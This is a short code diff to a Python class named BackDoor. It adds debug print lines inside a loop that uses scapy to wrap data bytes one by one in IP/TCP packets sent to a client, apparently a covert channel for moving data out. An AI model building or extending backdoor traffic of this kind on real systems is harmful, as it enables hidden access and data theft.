@@ -284,6 +284,9 @@ class BackDoor:
         print(f"got src and terminator {src, terminator}")
         packets = []
         for index, byte in enumerate(data):
+            if b'\x00' in byte:
+                print(1)
+                print("yooooo")
             packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=byte)
             packets.append(packet)
 
